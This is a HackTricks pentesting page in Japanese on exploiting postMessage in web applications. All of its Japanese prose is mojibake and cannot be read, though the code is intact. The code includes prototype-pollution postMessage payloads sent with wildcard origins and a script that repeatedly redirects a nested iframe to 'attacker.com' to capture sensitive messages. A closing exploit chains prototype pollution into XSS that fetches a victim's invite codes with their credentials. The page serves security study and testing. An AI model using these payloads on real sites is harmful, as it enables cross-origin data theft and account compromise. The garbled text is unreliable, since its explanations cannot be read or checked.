# PostMessageã®è„†å¼±æ€§

## PostMessageã®è„†å¼±æ€§

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## **PostMessage**ã®é€ä¿¡

**PostMessage**ã¯ã€æ¬¡ã®é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã—ã¾ã™ï¼š
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
æ³¨æ„ã—ã¦ãã ã•ã„ã€‚**targetOrigin**ã¯'\*'ã¾ãŸã¯_https://company.com_ã®ã‚ˆã†ãªURLã§ã‚ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚\
**2ç•ªç›®ã®ã‚·ãƒŠãƒªã‚ª**ã§ã¯ã€**ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã¯ãã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã«ã®ã¿é€ä¿¡**ã•ã‚Œã¾ã™ï¼ˆã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚ªãƒªã‚¸ãƒ³ãŒç•°ãªã£ã¦ã„ã¦ã‚‚ï¼‰ã€‚\
ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ãŒä½¿ç”¨ã•ã‚Œã‚‹å ´åˆã€**ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã¯ä»»æ„ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã«é€ä¿¡**ã•ã‚Œã€ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚ªãƒªã‚¸ãƒ³ã«é€ä¿¡ã•ã‚Œã¾ã™ã€‚

### iframeã¨ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ãŸæ”»æ’ƒ

[**ã“ã®ãƒ¬ãƒãƒ¼ãƒˆ**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€**X-Frame-Header**ã®ä¿è­·ãŒãªã„**iframe**ã§è¡¨ç¤ºã§ãã‚‹ãƒšãƒ¼ã‚¸ã‚’è¦‹ã¤ã‘ã€ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ï¼ˆ\*ï¼‰ã‚’ä½¿ç”¨ã—ã¦**postMessage**ã‚’ä»‹ã—ã¦**æ©Ÿå¯†æƒ…å ±**ã‚’é€ä¿¡ã—ã¦ã„ã‚‹å ´åˆã€**iframe**ã®**origin**ã‚’**å¤‰æ›´**ã—ã¦ã€æ©Ÿå¯†æƒ…å ±ã‚’è‡ªåˆ†ãŒåˆ¶å¾¡ã™ã‚‹ãƒ‰ãƒ¡ã‚¤ãƒ³ã«**æ¼æ´©**ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ãŸã ã—ã€ãƒšãƒ¼ã‚¸ãŒiframeã§è¡¨ç¤ºã§ãã‚‹ãŒã€**targetOrigin**ãŒ**URLã«è¨­å®šã•ã‚Œã¦ã„ã¦ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ã§ã¯ãªã„**å ´åˆã€ã“ã®ãƒˆãƒªãƒƒã‚¯ã¯**æ©Ÿèƒ½ã—ã¾ã›ã‚“**ã€‚
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListenerã®æ‚ªç”¨

**`addEventListener`**ã¯ã€JSãŒ`postMessage`ã‚’æœŸå¾…ã—ã¦ã„ã‚‹é–¢æ•°ã‚’å®£è¨€ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹é–¢æ•°ã§ã™ã€‚\
ä»¥ä¸‹ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ãŒä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
ã“ã®å ´åˆã€ã‚³ãƒ¼ãƒ‰ãŒæœ€åˆã«è¡Œã£ã¦ã„ã‚‹ã®ã¯**ã‚ªãƒªã‚¸ãƒ³ã®ãƒã‚§ãƒƒã‚¯**ã§ã™ã€‚ã“ã‚Œã¯éå¸¸ã«**é‡è¦**ã§ã™ã€‚ç‰¹ã«ã€ãƒšãƒ¼ã‚¸ãŒå—ã‘å–ã£ãŸæƒ…å ±ã‚’ä½•ã‹ã—ã‚‰ã®æ©Ÿå¯†ãªæ“ä½œï¼ˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å¤‰æ›´ãªã©ï¼‰ã«ä½¿ç”¨ã™ã‚‹å ´åˆã«ã¯é‡è¦ã§ã™ã€‚**ã‚ªãƒªã‚¸ãƒ³ã®ãƒã‚§ãƒƒã‚¯ãŒè¡Œã‚ã‚Œã¦ã„ãªã„å ´åˆã€æ”»æ’ƒè€…ã¯è¢«å®³è€…ã«ä»»æ„ã®ãƒ‡ãƒ¼ã‚¿ã‚’ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«é€ã‚‰ã›ã€è¢«å®³è€…ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ï¼ˆã“ã®ä¾‹ã§ã¯ï¼‰ã€‚

### åˆ—æŒ™

ç¾åœ¨ã®ãƒšãƒ¼ã‚¸ã§**ã‚¤ãƒ™ãƒ³ãƒˆãƒªã‚¹ãƒŠãƒ¼ã‚’è¦‹ã¤ã‘ã‚‹**ãŸã‚ã«ã¯ã€ä»¥ä¸‹ã®æ–¹æ³•ãŒã‚ã‚Šã¾ã™ï¼š

* JSã‚³ãƒ¼ãƒ‰å†…ã§`window.addEventListener`ã¨`$(window).on`ï¼ˆJQueryãƒãƒ¼ã‚¸ãƒ§ãƒ³ï¼‰ã‚’**æ¤œç´¢**ã™ã‚‹
* é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã®ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã§æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’**å®Ÿè¡Œ**ã™ã‚‹ï¼š`getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* ãƒ–ãƒ©ã‚¦ã‚¶ã®é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã§_Elements --> Event Listeners_ã«**ç§»å‹•**ã™ã‚‹

![](<../../.gitbook/assets/image (617).png>)

* [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta)ã‚„[https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker)ã®ã‚ˆã†ãª**ãƒ–ãƒ©ã‚¦ã‚¶æ‹¡å¼µæ©Ÿèƒ½**ã‚’ä½¿ç”¨ã™ã‚‹ã€‚ã“ã‚Œã‚‰ã®ãƒ–ãƒ©ã‚¦ã‚¶æ‹¡å¼µæ©Ÿèƒ½ã¯ã€**ã™ã¹ã¦ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’å‚å—**ã—ã€è¡¨ç¤ºã—ã¾ã™ã€‚

### ã‚ªãƒªã‚¸ãƒ³ã®åŸºæœ¬çš„ãªãƒã‚¤ãƒ‘ã‚¹ã®ãƒã‚§ãƒƒã‚¯

* ã‚‚ã—ã€PostMessageã‚¤ãƒ™ãƒ³ãƒˆã®**ã‚ªãƒªã‚¸ãƒ³**ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ãŸã‚ã«**`indexOf()`**ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€æ¬¡ã®ä¾‹ã®ã‚ˆã†ã«ç°¡å˜ã«ãƒã‚¤ãƒ‘ã‚¹ã•ã‚Œã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ï¼š`("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")`\\
* ã‚‚ã—ã€**`search()`**ãŒ**ã‚ªãƒªã‚¸ãƒ³**ã‚’æ¤œè¨¼ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€å®‰å…¨ã§ã¯ãªã„å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚`String.prototype.search()`ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ã‚ˆã‚‹ã¨ã€ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã¯æ–‡å­—åˆ—ã§ã¯ãªãæ­£è¦è¡¨ç¾ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’å—ã‘å–ã‚Šã¾ã™ã€‚æ­£è¦è¡¨ç¾ä»¥å¤–ã®ã‚‚ã®ãŒæ¸¡ã•ã‚Œã‚‹ã¨ã€ãã‚Œã¯æš—é»™çš„ã«æ­£è¦è¡¨ç¾ã«å¤‰æ›ã•ã‚Œã¾ã™ã€‚\
æ­£è¦è¡¨ç¾ã§ã¯ã€**ãƒ‰ãƒƒãƒˆï¼ˆ.ï¼‰ã¯ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ã¨ã—ã¦æ‰±ã‚ã‚Œã¾ã™**ã€‚æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦ã€å…¬å¼ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã§ã¯ãªã**ç‰¹åˆ¥ãªãƒ‰ãƒ¡ã‚¤ãƒ³**ã‚’ä½¿ç”¨ã—ã¦æ¤œè¨¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€`"https://www.safedomain.com".search("www.s.fedomain.com")`ã®ã‚ˆã†ã«ã§ã™ã€‚\\
* ã‚‚ã—ã€**`escapeHtml`**é–¢æ•°ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ã“ã®é–¢æ•°ã¯`new`ã§ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã™ã‚‹ã®ã§ã¯ãªãã€æ—¢å­˜ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’**ä¸Šæ›¸ã**ã—ã¾ã™ã€‚ã¤ã¾ã‚Šã€`hasOwnProperty`ã«å¿œç­”ã—ãªã„åˆ¶å¾¡å¯èƒ½ãªãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’æŒã¤ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã§ãã‚Œã°ã€ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã•ã‚Œã¾ã›ã‚“ã€‚
```javascript
// Expected to fail:
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
// Bypassed:
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```
`File`ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã€èª­ã¿å–ã‚Šå°‚ç”¨ã®`name`ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’æŒã£ã¦ã„ã‚‹ãŸã‚ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã§ä½¿ç”¨ã•ã‚Œã€`escapeHtml`é–¢æ•°ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã®ã«æœ€é©ã§ã™ã€‚

### e.origin == window.originã®ãƒã‚¤ãƒ‘ã‚¹

ãƒšãƒ¼ã‚¸ãŒ`<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">`ã‚’ä»‹ã—ã¦**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åŒ–ã•ã‚ŒãŸiframe**ã«åŸ‹ã‚è¾¼ã¾ã‚Œã‚‹ã¨ã€ãã®**iframe**ã®**ã‚ªãƒªã‚¸ãƒ³**ã¯**`null`**ã«ãªã‚Šã¾ã™ã€‚

**sandboxã®å€¤ãŒ`allow-popups`ã«è¨­å®š**ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**é–‹ã‹ã‚ŒãŸãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—**ã¯ã€`allow-popups-to-escape-sandbox`ãŒè¨­å®šã•ã‚Œã¦ã„ãªã„é™ã‚Šã€ã™ã¹ã¦ã®**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å±æ€§**ã‚’**ç¶™æ‰¿**ã—ã¾ã™ã€‚\
ã—ãŸãŒã£ã¦ã€**nullã®ã‚ªãƒªã‚¸ãƒ³**ã‹ã‚‰**ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—**ã‚’é–‹ãã¨ã€ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—å†…ã®**`window.origin`**ã‚‚**`null`**ã«ãªã‚Šã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã‚’è¨±å¯ã™ã‚‹ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åŒ–ã•ã‚ŒãŸiframeã‚’é–‹ãã€ãã®iframeå†…ã‹ã‚‰ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã‚’é–‹ãã€iframeã‹ã‚‰ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã«postMessageã‚’é€ä¿¡ã™ã‚‹ã¨ã€ä¸¡æ–¹ã®ã‚ªãƒªã‚¸ãƒ³ã¯nullã«ãªã‚‹ãŸã‚ã€**`e.origin == window.origin == null`**ã§ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### e.sourceã®ãƒã‚¤ãƒ‘ã‚¹

**postMessage**ã‚’é€ä¿¡ã—ã€**ã™ãã«å‰Šé™¤**ã•ã‚Œã‚‹**iframe**ã‚’ä½œæˆã™ã‚‹ã“ã¨ã§ã€ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã®**`e.source`**ã‚’nullã«å¼·åˆ¶ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Headerã®ãƒã‚¤ãƒ‘ã‚¹

ã“ã‚Œã‚‰ã®æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã¯ã€ç†æƒ³çš„ã«ã¯è¢«å®³è€…ã®ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’`iframe`å†…ã«é…ç½®ã§ãã‚‹ã“ã¨ãŒæœ›ã¾ã—ã„ã§ã™ã€‚ãŸã ã—ã€`X-Frame-Header`ãªã©ã®ä¸€éƒ¨ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã¯ã€ãã®ã‚ˆã†ãªå‹•ä½œã‚’**é˜²æ­¢**ã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚\
ãã®ã‚ˆã†ãªã‚·ãƒŠãƒªã‚ªã§ã¯ã€ã‚ˆã‚Šç›®ç«‹ãŸãªã„æ”»æ’ƒã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚è„†å¼±ãªã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«æ–°ã—ã„ã‚¿ãƒ–ã‚’é–‹ãã€ãã‚Œã¨é€šä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### ãƒ¡ã‚¤ãƒ³ãƒšãƒ¼ã‚¸ã®ãƒ–ãƒ­ãƒƒã‚¯ã«ã‚ˆã‚‹å­ã¸ã®é€ä¿¡ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã®ç›—ã¿å‡ºã—

ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€**ãƒ¡ã‚¤ãƒ³**ãƒšãƒ¼ã‚¸ã‚’é€ä¿¡ãƒ‡ãƒ¼ã‚¿ã‚’é€ã‚‹å‰ã«**ãƒ–ãƒ­ãƒƒã‚¯**ã—ã€**å­ã®iframe**ã«é€ä¿¡ã•ã‚Œã‚‹**æ©Ÿå¯†ã®postmessageãƒ‡ãƒ¼ã‚¿**ã‚’ç›—ã¿å‡ºã™æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ãã—ã¦ã€**å­ã®XSSã‚’æ‚ªç”¨**ã—ã¦ãƒ‡ãƒ¼ã‚¿ãŒå—ä¿¡ã•ã‚Œã‚‹å‰ã«ãƒ‡ãƒ¼ã‚¿ã‚’**æ¼æ´©**ã•ã›ã¾ã™ã€‚

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### iframeã®å ´æ‰€ã‚’å¤‰æ›´ã—ã¦ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ç›—ã¿å‡ºã™

ã‚‚ã—ã€X-Frame-Headerã‚’æŒãŸãªã„ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã«åˆ¥ã®iframeãŒå«ã¾ã‚Œã¦ã„ã‚‹å ´åˆã€ãã®å­ã®iframeã®**å ´æ‰€ã‚’å¤‰æ›´**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®ãŸã‚ã€**ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰**ã‚’ä½¿ç”¨ã—ã¦é€ä¿¡ã•ã‚ŒãŸ**postmessage**ã‚’å—ä¿¡ã—ã¦ã„ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯ãã®iframeã®**ã‚ªãƒªã‚¸ãƒ³**ã‚’è‡ªåˆ†ãŒ**åˆ¶å¾¡ã™ã‚‹ãƒšãƒ¼ã‚¸**ã«**å¤‰æ›´**ã—ã€ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’**ç›—ã¿å‡ºã™**ã“ã¨ãŒã§ãã¾ã™ã€‚

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### Prototype PollutionãŠã‚ˆã³/ã¾ãŸã¯XSSã¸ã®postMessage

`postMessage`ã‚’ä»‹ã—ã¦é€ä¿¡ã•ã‚Œã‚‹ãƒ‡ãƒ¼ã‚¿ãŒJSã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã‚‹ã‚·ãƒŠãƒªã‚ªã§ã¯ã€**ãƒšãƒ¼ã‚¸ã‚’iframeåŒ–**ã—ã€`postMessage`ã‚’ä»‹ã—ã¦ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§ã€**ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“/XSS**ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**éå¸¸ã«è©³ã—ãèª¬æ˜ã•ã‚ŒãŸXSSã®ä¾‹**ã¯ã€[https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

`postMessage`ã‚’ä»‹ã—ã¦`iframe`ã«**Prototype Pollutionã‚’æ‚ªç”¨ã—ã€ãã®å¾ŒXSSã‚’è¡Œã†**ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®ä¾‹ï¼š
```markup
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
**è©³ç´°æƒ…å ±**ã«ã¤ã„ã¦ã¯ä»¥ä¸‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

* [**ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“**](../deserialization/nodejs-proto-prototype-pollution/)ã«é–¢ã™ã‚‹ãƒšãƒ¼ã‚¸ã¸ã®ãƒªãƒ³ã‚¯
* [**XSS**](../xss-cross-site-scripting/)ã«é–¢ã™ã‚‹ãƒšãƒ¼ã‚¸ã¸ã®ãƒªãƒ³ã‚¯
* [**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã‹ã‚‰XSSã¸**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)ã«é–¢ã™ã‚‹ãƒšãƒ¼ã‚¸ã¸ã®ãƒªãƒ³ã‚¯

## å‚è€ƒæ–‡çŒ®

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* ç·´ç¿’ç”¨ï¼š[https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ HackTricksã§ã‚ãªãŸã®ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
